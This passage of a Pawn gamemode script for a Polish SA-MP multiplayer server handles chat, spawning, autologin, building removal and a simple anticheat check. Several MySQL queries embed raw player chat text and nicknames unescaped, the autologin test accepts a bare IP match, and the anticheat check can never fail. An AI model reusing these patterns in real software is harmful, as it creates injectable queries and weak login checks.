		format(query,sizeof query,"~w~%02d:%02d",godz,minu);
		TextDrawSetString(timetd,query);
		TextDrawShowForAll(timetd);


		if(BonusCargo == true)
		{
			SendRconCommand("mapname HappyWorld!");
		}
		else if(BonusCargo == false)
		{
			SendRconCommand("mapname Zapraszamy!");
		}


		new lstring[150];
		format(lstring,sizeof lstring,"# Licencja prawidlowa! "BIALYHEX"%s",LicenceInfo[Name]);


		/*if(minu == 0 && sekund == 0)
		{
			BonusCargo = true;
		}*/


		if(minu == 0 && sekund == 0)
		{
			MESSAGE_TIME_INFO;
			SendClientMessageToAll(Zielony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
			SetTimer("respawn",30*1000,false);
			SaveVehicles();
		}

		if(minu == 15 && sekund == 0)
		{
			MESSAGE_TIME_INFO;
			SendClientMessageToAll(Zielony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
			SetTimer("respawn",30*1000,false);
			SaveVehicles();
		}

		if(minu == 30 && sekund == 0)
		{
			MESSAGE_TIME_INFO;
			SendClientMessageToAll(Zielony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
			SetTimer("respawn",30*1000,false);
			SaveVehicles();
		}
		if(minu == 45 && sekund == 0)
		{
			MESSAGE_TIME_INFO;
			SendClientMessageToAll(Zielony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
			SetTimer("respawn",30*1000,false);
			SaveVehicles();
		}
		if(minu == 55 && sekund == 0)
		{
			MESSAGE_TIME_INFO;
			SendClientMessageToAll(Zielony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
			SetTimer("respawn",30*1000,false);
			SaveVehicles();
		}

		format(query,sizeof query,"worldtime %02d:%02d %02d",godz,minu,sekund);
		
		SendRconCommand(query);

		//format(query,sizeof query,"%d:%d",godz,minu);

		SetWorldTime((godz));



		return 1;
	}

	public OnGameModeExit()
	{

		printf("[server] Zamykanie servera....");
		return 1;

	}

	public OnVehicleSpawn(vehicleid)
	{
		for(new i=0; i < GetMaxPlayers(); i++)
		{
			if(GetPlayerVehicleID(i) == vehicleid)
			{
			SetPVarInt(i,"teleportTimer",1);
			SetTimerEx("timerAntyCheatVeh",4000,false,"i",i);
			}
		}



		return 1;
	}

	public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
	{

		for(new xs = 0; xs < GetMaxPlayers(); xs++)
		{

			if( IsPlayerConnected(xs) &&	GetPlayerState(xs) == PLAYER_STATE_SPECTATING && gSpectateID[xs] == playerid && gSpectateType[xs] == ADMIN_SPEC_TYPE_PLAYER )
			{
				SetPlayerInterior(xs,newinteriorid);
			}

		}
	}

	forward napisalminus(playerid);
	public napisalminus(playerid)
	{
		SetPVarInt(playerid,"napisal",GetPVarInt(playerid,"napisal")-1);
		return 1;
	}

	public OnPlayerText(playerid, text[])
	{

		if(strval(text) == 69) SprawdzOsiagniecie(playerid,7);


		if(GetPVarInt(playerid,"mute") == 1)
		{
			SendClientMessage(playerid,Szary,"# Zostales wyciszony, nie mozesz pisac na czacie!");

			for(new iam=0; iam < GetMaxPlayers(); iam++)
			{

				if(IsPlayerConnected(iam) && PlayerInfo[iam][LevelAdmin] >= 1)
				{
					new string[200];
					format(string,sizeof string,"[MUTE] %s (%d): %s",PlayerName(playerid),playerid,text);
					SendClientMessage(iam,Szary,string);
					
				}

			}

			return 0;
		}


		new buffer[300];


		new r,ye,d,h,m,s;
		getdate(r,ye,d);
		gettime(h,m,s);

		new data[100];
		format(data,sizeof data,"%d-%02d-%02d %02d:%02d:%02d",r,ye,d,h,m,s);

		format(buffer,sizeof buffer,"INSERT INTO `chat`(`nick`, `text`, `ingame`, `waiting`,`date`) VALUES ('%s','%s','1','0','%s')",PlayerName(playerid),text,data);
		mysql_query(buffer);


		SetPVarInt(playerid,"napisal",GetPVarInt(playerid,"napisal")+1);

		timernapisal[playerid] = SetTimerEx("napisalminus",1200,false,"i",playerid);

		if(GetPVarInt(playerid,"napisal") == 3)
		{
			return KickExServer(playerid,"Spam/Flood");
		}


		if(text[0] == '@' && PlayerInfo[playerid][LevelAdmin] >= 1)
		{

			for(new ia=0; ia < GetMaxPlayers(); ia++)
			{

				if(IsPlayerConnected(ia) && PlayerInfo[ia][LevelAdmin] >= 1)
				{
					new string[200];
					format(string,sizeof string,"# AC: %s - %d: %s",PlayerName(playerid),playerid,text[1]);
					SendClientMessage(ia,Czerwony,string);
					
				}

			}

			return 0;

		}


		new string[200];
		new teamname[50];

		if(PlayerInfo[playerid][Team] >= 1)
		{
			format(teamname,sizeof teamname,"%s",GetTeamName(PlayerInfo[playerid][Team]));
		}
		else
		{
			format(teamname,sizeof teamname,"Bezrobotny");
		}


		new color;
		new query[150];
		format(query,sizeof query,"SELECT `colorinphp` FROM `company` WHERE `id` = '%d'",PlayerInfo[playerid][Team]);
		mysql_query(query);
		mysql_store_result();
		mysql_fetch_row(query,"|");
		sscanf(query,"p<|>x",color);
		mysql_free_result();

		if(PlayerInfo[playerid][VIP] == 1 && PlayerInfo[playerid][Team] >= 1)
		{
			format(string,sizeof string,"{%x}%s:"BIALYHEX" VIP - (%d) : {FFFFFF}%s",color,PlayerName(playerid),playerid,text);
		}

		else if(PlayerInfo[playerid][VIP] == 0 && PlayerInfo[playerid][Team] >= 1)
		{
			format(string,sizeof string,"{%x}%s:"BIALYHEX" (%d) : "BIALYHEX"%s",color,PlayerName(playerid),playerid,text);
		}
		else if(PlayerInfo[playerid][VIP] == 1 && PlayerInfo[playerid][Team] == 0)
		{

			// BEZROBOTNY #9e9e9e
			format(string,sizeof string,"{9e9e9e}%s:"BIALYHEX" VIP - (%d) : "BIALYHEX"%s",PlayerName(playerid),playerid,text);
		}
		else
		{
			// BEZROBOTNY #9e9e9e
			format(string,sizeof string,"{9e9e9e}%s:"BIALYHEX" (%d) : %s",PlayerName(playerid),playerid,text);
		}
		SendClientMessageToAll(Bialy,string);


		return 0;
	}

	public OnPlayerRequestClass(playerid, classid)
	{
		new buffer[150];
		format(buffer,sizeof buffer,"SELECT * FROM `houses` WHERE `owner` = '%s' AND `spawn` = '1' LIMIT 1",PlayerName(playerid));
		mysql_query(buffer);
		mysql_store_result();

		new num = mysql_num_rows();

		mysql_free_result();

		if(PlayerInfo[playerid][Team] >= 1 && num == 0)
		{
			new query[150];
			format(query,sizeof query,"SELECT `spawnx`,`spawny`,`spawnz` FROM `company` WHERE `id` = '%d'",PlayerInfo[playerid][Team]);
			mysql_query(query);
			mysql_store_result();
			mysql_fetch_row(query,"|");
			new Float:xt,Float:yt,Float:zt;
			sscanf(query,"p<|>fff",xt,yt,zt);
			mysql_free_result();


			SetSpawnInfo(playerid, NO_TEAM, PlayerInfo[playerid][Skin], xt,yt,zt, 0, 367, 1000, 0, 0, 0, 0);

		}
		else if(PlayerInfo[playerid][Team] == 0)
		{
			SetSpawnInfo(playerid, NO_TEAM, PlayerInfo[playerid][Skin], 405.4049, 2536.5229, 16.5461, 0, 367, 1000, 0, 0, 0, 0);

		}

		if(num == 1)
		{
			format(buffer,sizeof buffer,"SELECT `x`,`y`,`z` FROM `houses` WHERE `owner` = '%s' AND `spawn` = '1' LIMIT 1",PlayerName(playerid));
			mysql_query(buffer);
			mysql_store_result();
			new Float:xt,Float:yt,Float:zt;

			mysql_fetch_row(buffer,"|");
			sscanf(buffer,"p<|>fff",xt,yt,zt);


			mysql_free_result();

			SetSpawnInfo(playerid, NO_TEAM, PlayerInfo[playerid][Skin], xt,yt,zt, 0, 367, 1000, 0, 0, 0, 0);

		}
		SpawnPlayer(playerid);
		SetPVarInt(playerid,"napisal",0);
		return 1;
	}

	forward czaslogowania(playerid);
	public czaslogowania(playerid)
	{
		if(IsPlayerConnected(playerid))
		{
			KickExServer(playerid,"Czas logowania minal!");
		}
	}



	public OnPlayerConnect(playerid)
	{
		SetPVarInt(playerid,"banned",0);
		if(BonusCargo == true)
		{
		TextDrawShowForPlayer(playerid,hwTD);
		TextDrawShowForPlayer(playerid,hwusebox);
		}

		// penl lotnisko
		RemoveBuildingForPlayer(playerid, 1308, 9.0234, 15.1563, -5.7109, 0.25);
		RemoveBuildingForPlayer(playerid, 13029, 93.4063, -173.8281, 1.9688, 0.25);
		RemoveBuildingForPlayer(playerid, 13189, 92.1250, -164.9141, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 13196, 111.4453, -188.8594, 0.4844, 0.25);
		RemoveBuildingForPlayer(playerid, 13197, 93.2422, -188.8594, 0.4844, 0.25);
		RemoveBuildingForPlayer(playerid, 13199, 100.5234, -173.8906, 0.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 79.9219, -176.5234, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1449, 111.8672, -174.7891, 1.0625, 0.25);
		RemoveBuildingForPlayer(playerid, 12926, 100.5234, -173.8906, 0.0000, 0.25);
		RemoveBuildingForPlayer(playerid, 672, 65.7891, -168.7266, 0.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 12927, 93.4063, -173.8281, 1.9688, 0.25);
		RemoveBuildingForPlayer(playerid, 12942, 92.1250, -164.9141, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 12943, 92.1250, -164.9141, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 1482, 93.0391, -159.1094, 2.9141, 0.25);
		RemoveBuildingForPlayer(playerid, 1684, 81.1250, -152.7344, 3.0703, 0.25);
		RemoveBuildingForPlayer(playerid, 1426, 97.9141, -148.6563, 1.6563, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 121.6953, -148.6016, 0.5469, 0.25);
		RemoveBuildingForPlayer(playerid, 1426, 94.2188, -148.6563, 1.6563, 0.25);
		RemoveBuildingForPlayer(playerid, 706, 111.0234, -134.5625, -0.0547, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -10.9141, 15.3828, 2.8906, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 79.2969, -200.9297, 0.7031, 0.25);
		RemoveBuildingForPlayer(playerid, 13437, 210.9375, -245.1406, 10.0234, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -16.7031, -194.8516, 1.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -4.1797, -196.0547, 1.5078, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, 18.5469, -197.7500, 1.4609, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, 30.3906, -198.5938, 1.4609, 0.25);
		RemoveBuildingForPlayer(playerid, 3335, -7.7969, -198.3203, 0.6563, 0.25);
		RemoveBuildingForPlayer(playerid, 1308, 23.7578, -198.5625, 0.7031, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 82.4219, -197.1094, 0.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 1426, 106.1094, -195.5938, 0.6484, 0.25);
		RemoveBuildingForPlayer(playerid, 1684, 81.1250, -190.9844, 2.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 106.0859, -192.8828, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 106.0859, -190.8672, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -41.1797, -192.3672, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -52.6172, -189.8906, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 1449, 97.4609, -190.1875, 0.9609, 0.25);
		RemoveBuildingForPlayer(playerid, 1482, 99.2188, -190.2031, 1.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 1426, 116.5078, -191.0938, 0.6484, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -78.4688, -187.5703, 1.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -63.1563, -184.8672, 1.7109, 0.25);
		RemoveBuildingForPlayer(playerid, 12925, 111.4453, -188.8594, 0.4844, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 106.2188, -184.8828, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 12928, 93.2422, -188.8594, 0.4844, 0.25);
		RemoveBuildingForPlayer(playerid, 12929, 93.2422, -188.8594, 0.4844, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 90.7813, -186.5625, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 12930, 93.0859, -186.3594, 1.3047, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 116.6484, -188.0234, 0.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 98.4766, -186.8750, 0.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 79.9219, -182.7813, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 79.9219, -180.7656, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 92.6406, -182.2813, 1.2891, 0.25);
		RemoveBuildingForPlayer(playerid, 1685, 90.6641, -182.3047, 1.2891, 0.25);

		// baza penl
		RemoveBuildingForPlayer(playerid, 13191, 65.2578, -303.9844, 14.4531, 0.25);
		RemoveBuildingForPlayer(playerid, 13192, 164.7109, -234.1875, 0.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 13193, 173.5156, -323.8203, 0.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 13194, 140.5938, -305.3906, 5.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 13195, 36.8281, -256.2266, 0.4688, 0.25);
		RemoveBuildingForPlayer(playerid, 12858, 272.0625, -359.7656, 8.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 1426, 29.1719, -292.2734, 1.4063, 0.25);
		RemoveBuildingForPlayer(playerid, 1431, 36.4297, -291.0625, 1.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 1426, 24.5938, -291.7578, 1.4063, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 29.2344, -286.0547, 1.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 1440, 32.4063, -289.2188, 1.6484, 0.25);
		RemoveBuildingForPlayer(playerid, 1438, 33.6016, -279.3516, 1.1172, 0.25);
		RemoveBuildingForPlayer(playerid, 12861, 36.8281, -256.2266, 0.4688, 0.25);
		RemoveBuildingForPlayer(playerid, 1450, 43.4844, -252.5703, 1.2031, 0.25);
		RemoveBuildingForPlayer(playerid, 1449, 43.1094, -254.9609, 1.2188, 0.25);
		RemoveBuildingForPlayer(playerid, 12859, 173.5156, -323.8203, 0.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 12805, 65.2578, -303.9844, 14.4531, 0.25);
		RemoveBuildingForPlayer(playerid, 13198, 140.5938, -305.3906, 5.5938, 0.25);
		RemoveBuildingForPlayer(playerid, 12956, 96.3281, -261.1953, 3.8594, 0.25);
		RemoveBuildingForPlayer(playerid, 12860, 164.7109, -234.1875, 0.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 13437, 210.9375, -245.1406, 10.0234, 0.25);

		// baza pd

		RemoveBuildingForPlayer(playerid, 1232, -2916.4558, 419.91064, 5.01563, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, -2911.7271, 422.65997, 4.66611, 0.25);
		RemoveBuildingForPlayer(playerid, 1280, -2887.8452, 422.20865, 4.47842, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, -2880.4517, 419.76361, 6.60258, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, -2916.761, 506.7012, 5.86492, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, -2961.7195, 483.93073, 5.48884, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, -2938.3733, 457.65213, 7.10475, 0.25);
		RemoveBuildingForPlayer(playerid, 1232, -2993.6414, 457.92566, 5.95218, 0.25);


		RemoveBuildingForPlayer(playerid, 3276, -141.8203, -177.0078, 1.7969, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -153.3125, -174.8047, 1.8359, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -118.9219, -175.4766, 1.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -177.7031, -169.8594, 1.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -134.9063, -172.0625, 1.8516, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -189.7266, -167.2734, 1.9922, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -212.9922, -161.6875, 2.1172, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -118.9688, -165.6719, 2.3203, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -130.8203, -160.7656, 2.5156, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -116.6172, -153.6328, 2.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -124.4297, -136.6172, 2.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -41.1797, -192.3672, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -52.6172, -189.8906, 1.5859, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -78.4688, -187.5703, 1.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -102.4688, -183.6875, 1.7422, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -63.1563, -184.8672, 1.7109, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -115.2188, -181.6797, 1.7813, 0.25);
		RemoveBuildingForPlayer(playerid, 13052, -69.0469, 86.8359, 2.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 13053, -59.9531, 110.4609, 13.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 13054, -61.4531, -36.9922, 1.9766, 0.25);
		RemoveBuildingForPlayer(playerid, 13057, -120.0234, -77.9063, 14.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 3376, -96.0859, 3.1953, 6.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 3376, -15.5234, 68.4531, 6.6641, 0.25);
		RemoveBuildingForPlayer(playerid, 13477, -21.9453, 101.3906, 4.5313, 0.25);
		RemoveBuildingForPlayer(playerid, 13488, -81.5703, -79.4453, 4.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 705, -65.6719, -96.1719, 1.9453, 0.25);
		RemoveBuildingForPlayer(playerid, 13367, -120.0234, -77.9063, 14.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 13489, -81.5703, -79.4453, 4.5234, 0.25);
		RemoveBuildingForPlayer(playerid, 1428, -118.5000, -75.9375, 5.2578, 0.25);
		RemoveBuildingForPlayer(playerid, 1428, -116.7578, -76.3516, 3.5391, 0.25);
		RemoveBuildingForPlayer(playerid, 705, -58.6328, -66.6250, 2.0938, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -93.2266, -59.8906, 2.9297, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -108.0781, -58.5391, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3175, -143.5156, -51.3516, 1.9141, 0.25);
		RemoveBuildingForPlayer(playerid, 672, -140.6016, -44.9531, 2.8750, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -115.4141, -49.9844, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 12911, -61.4531, -36.9922, 1.9766, 0.25);
		RemoveBuildingForPlayer(playerid, 12917, -99.9922, -40.3047, 1.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -118.2891, -39.9219, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -118.2891, -39.9219, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -77.4609, -21.3203, 2.8906, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -115.6484, -28.9688, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -115.6484, -28.9688, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -67.6719, 2.0469, 2.8906, 0.25);
		RemoveBuildingForPlayer(playerid, 3374, -50.0156, 3.1797, 3.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 3375, -96.0859, 3.1953, 6.6953, 0.25);
		RemoveBuildingForPlayer(playerid, 12914, -75.1797, 12.1719, 3.7188, 0.25);
		RemoveBuildingForPlayer(playerid, 12918, -72.0391, 18.4453, 1.9531, 0.25);
		RemoveBuildingForPlayer(playerid, 672, -35.7109, 18.1016, 3.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -94.5234, 31.6172, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -90.5313, 42.1484, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -81.8984, 56.8516, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3276, -71.8359, 58.8750, 2.8828, 0.25);
		RemoveBuildingForPlayer(playerid, 3374, -92.8672, 58.3438, 3.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 3374, -91.9453, 47.8125, 3.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 3375, -15.5234, 68.4531, 6.6641, 0.25);
		RemoveBuildingForPlayer(playerid, 12915, -69.0469, 86.8359, 2.1094, 0.25);
		RemoveBuildingForPlayer(playerid, 672, -15.2109, 94.8438, 3.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 3374, -41.2500, 98.4141, 3.4609, 0.25);
		RemoveBuildingForPlayer(playerid, 3374, -36.0156, 96.1875, 3.5703, 0.25);
		RemoveBuildingForPlayer(playerid, 12912, -59.9531, 110.4609, 13.4766, 0.25);
		RemoveBuildingForPlayer(playerid, 12913, -21.9453, 101.3906, 4.5313, 0.25);
		RemoveBuildingForPlayer(playerid, 759, -25.0625, 104.7578, 1.7422, 0.25);

		
		SetPVarInt(playerid,"playerPrzystanek",-1);
		SetPVarInt(playerid,"playerKurs",-1);
		gSpectator[playerid] = INVALID_PLAYER_ID;

		SetPVarInt(playerid,"czasgry",0);

		for(new i=0; i < sizeof(NiedozwoloneNicki); i++)
		{
			if(strfind(PlayerName(playerid),NiedozwoloneNicki[i], true) != -1)
			{
				KickExServer(playerid,"Zmien nick czlowieku!");
			}
		}
		for(new p=0; p <= LoadedInfo[Magazines]; p++)
		{
			SetPlayerMapIcon(playerid, p, MagazineInfo[p][x],MagazineInfo[p][y],MagazineInfo[p][z], 51, 0, MAPICON_LOCAL );
		}
		PlayAudioStreamForPlayer(playerid, "http://pwtruck.pl/music/6.mp3");

		CheckBan(playerid);

		SetPVarInt(playerid, "Timerek", SetTimerEx("Bramka", 1000, true, "d", playerid));

		SetPVarInt(playerid, "WBramce", false);

		SetPVarInt(playerid,"zalogowany",0);
		TimerLogowania[playerid] = SetTimerEx("czaslogowania",60*1000,false,"i",playerid);
		SetPVarInt(playerid,"czasgry",0);
		SetTimerEx("czasplus",60*1000,true,"i",playerid);
		SetPVarInt(playerid,"pausedstart",0);
		TextDrawShowForPlayer(playerid,pasekuser[playerid]);
		TextDrawShowForPlayer(playerid,useboxuser[playerid]);
		new Query[80],string[164];
		format(Query,sizeof(Query),"SELECT `ip`,`autologin` FROM `users` WHERE `nick` = '%s' LIMIT 1;",PlayerName(playerid));
		mysql_query(Query);
		mysql_store_result();
		if(mysql_num_rows() != 0)
		{
			mysql_fetch_row(Query,"|");

			new ipus[16],alog;
			sscanf(Query,"p<|>s[16]d",ipus,alog);

			new ip[16];
			GetPlayerIp(playerid, ip, sizeof ip);

			if(GetPVarInt(playerid,"banned") == 1) Kick(playerid);
			if(!strcmp(ipus,ip,false) || !strcmp(ip,"127.0.0.1",false) && alog == 1 && GetPVarInt(playerid,"banned") != 1)
			{

				SendClientMessage(playerid,Zielony,"# Zostales zalogowany automatycznie! Aby wylaczyc funkcje wpisz "BIALYHEX"/autologin");
				LoadUser(playerid);
				format(logstring,sizeof logstring,"Loguje sie na konto z ip %s || Register IP: %s",ip,ipus);
				AddLog(PlayerName(playerid),logstring);
			}
			else
			{

			format(string, sizeof(string), "Witaj %s na serwerze. \nTwoje konto jest zarejestrowane. \nWpisz ponizej swoje haslo.", PlayerName(playerid));
			ShowPlayerDialog(playerid, Logowanie, DIALOG_STYLE_PASSWORD, "Logowanie", string, "Loguj", "Anuluj");
			}
		}
		else
		{
			format(string, sizeof(string), "Witaj %s na serwerze. \nTwoje konto nie jest zarejestrowane. \nPonizej wpisz haslo do swojego konta.", PlayerName(playerid));
			ShowPlayerDialog(playerid, Rejestracja, DIALOG_STYLE_PASSWORD, "Rejestracja", string, "Rejestruj", "Anuluj");
		}
		mysql_free_result();


		printf("[AntyCheat] %s joined to the game, check modyfication's! Rozpoczynam procedure sprawdzania!", PlayerName(playerid));
		new actionid = 0x5, memaddr = 0x5E8606, retndata = 4;
		SendClientCheck(playerid, actionid, memaddr, NULL, retndata);
		printf("[AntyCheat] Check %s: ID:%d :ActionID:%d MemaDDR:%d NULL:%d RetnDATA:%d", PlayerName(playerid), playerid, actionid, memaddr, NULL, retndata);
		switch(retndata)
		{
			case 4:
			{
				printf("[AntyCheat] %s - modyfication: OKK!", PlayerName(playerid));
			}

			default:
			{
				printf("[AntyCheat] %s - modyfication: s0beit or d3d9.dll!!!", PlayerName(playerid));
			}

		}

		SetTimerEx("funkcjeAnty",1000,true,"i",playerid);



		return 1;
	}

	forward funkcjeAnty(playerid);
	public funkcjeAnty(playerid)
	{
		AntyVehLocation(playerid);
		return 1;//print("test");
	}

	forward czasplus(playerid);
	public czasplus(playerid)
	{
		SetPVarInt(playerid,"czasgry",GetPVarInt(playerid,"czasgry")+1);
		if(GetPVarInt(playerid,"czasgry") == 60)
		{
			SprawdzOsiagniecie(playerid,3);
		}

		return 1;
	}

	public OnPlayerSpawn(playerid)
	{

		StopAudioStreamForPlayer(playerid);

		SetPVarInt(playerid,"pausedstart",1);


		if(PlayerInfo[playerid][Team] == COMPANY_POLICJA)
		{
			GivePlayerWeapon(playerid, 3, 99999);
			GivePlayerWeapon(playerid, 31, 99999);
			GivePlayerWeapon(playerid, 25, 99999);
			GivePlayerWeapon(playerid, 28, 99999);
			GivePlayerWeapon(playerid, 24, 99999);
			GivePlayerWeapon(playerid, 1272, 99999);
		}
		if(PlayerInfo[playerid][Team] == COMPANY_PD)
		{
			GivePlayerWeapon(playerid, 41, 99999);
		}

		GivePlayerWeapon(playerid, 43, 99999);
		if(PlayerInfo[playerid][Team] == COMPANY_STRAZ)
		{
			GivePlayerWeapon(playerid, 42, 99999);
		}

		return 1;
	}




	forward checkpause();
	public checkpause()
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{




			if(IsPlayerConnected(i))
			{


				if(paused[i] == true)
				{
					//SetPlayerColor(i,0x000000AA);
					SetPVarInt(i,"kolor",0);
				}

				paused[i] = true;

			}
		}
	}


	public OnPlayerUpdate(playerid)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{
			new Float:predx, Float:predy, Float:predz,predb;
			GetVehicleVelocity(vehid,predx,predy,predz);
			predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

			if(predb >= 200)
			{
				SprawdzOsiagniecie(playerid,5);
			}
		}

		if(GetPVarInt(playerid,"skuty") == 1)
		{
			new poli = GetPVarInt(playerid,"skutyprzez");
			new Float:xo,Float:yo,Float:zo;
			GetPlayerPos(poli,xo,yo,zo);
			SetPlayerPos(playerid,xo,yo+1,zo);


			SetPlayerInterior(playerid,GetPlayerInterior(poli));

//			new vehid = GetPlayerVehicleID(poli);
			if(vehid != 0)
			{
				TogglePlayerControllable(playerid,1);
				PutPlayerInVehicle(playerid, vehid, 1);
				SetPlayerSpecialAction(playerid, 0);
			}
			else
			{
				TogglePlayerControllable(playerid,0);
				SetPlayerSpecialAction(playerid, 24);
				RemovePlayerFromVehicle(playerid);
			}




		}

		/*
		if(GetPVarInt(playerid,"kolor") == 0)
		{
			SetPVarInt(playerid,"kolor",0);
			if(PlayerInfo[playerid][Team] >= 1)
			{
				new query[150];
				new color;
				format(query,sizeof query,"SELECT `color` FROM `company` WHERE `id` = '%d'",PlayerInfo[playerid][Team]);
				mysql_query(query);
				mysql_store_result();
				mysql_fetch_row(query,"|");
				sscanf(query,"p<|>x",color);
				mysql_free_result();
				new str[10];
				format(str,10,"0x%xFF",color);

				//printf("[DEBUG] %s color %s team %d",PlayerName(playerid),str,PlayerInfo[playerid][Team]);
				SetPlayerColor(playerid,color);
			}
			else
			{
				SetPlayerColor(playerid,0xa0a19aAA);
			}

		}
		*/

		paused[playerid] = false;

		if(GetPVarInt(playerid,"zalogowany") == 1)
		{
			new stringtd[300];
			format(stringtd,sizeof stringtd,"~y~ID: ~w~%d~y~ UID: ~w~%d~y~ Nick: ~w~%s~y~ Score: ~w~%d~y~ Money: ~w~$%d~y~ Legalne: ~w~%d~y~ Nielegalne: ~w~%d~y~",playerid,PlayerInfo[playerid][UID],PlayerName(playerid),GetScoreEx(playerid),GetMoneyEx(playerid),PlayerInfo[playerid][Legalne],PlayerInfo[playerid][Nielegalne]);
			TextDrawSetString(pasekuser[playerid],stringtd);
		}

		/*if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !Flak[GetPlayerVehicleID(playerid)])
		{
			Loop(i, GetMaxPlayers())
			{
				if(GetPVarInt(playerid, "Kolczatka") == -1) continue;
				new Float:obiekt[3];
				GetObjectPos(GetPVarInt(i, "Kolczatka"), obiekt[0], obiekt[1], obiekt[2]);
				if(IsPlayerInRangeOfPoint(playerid, 5.0, obiekt[0], obiekt[1], obiekt[2]))
				{
					Flak[GetPlayerVehicleID(playerid)] = true;
					new panels, doors, lights, tires;
					GetVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, tires);
					UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, random(16));
				}
			}
		}*/







		/*
		new vehid = GetPlayerVehicleID(playerid);
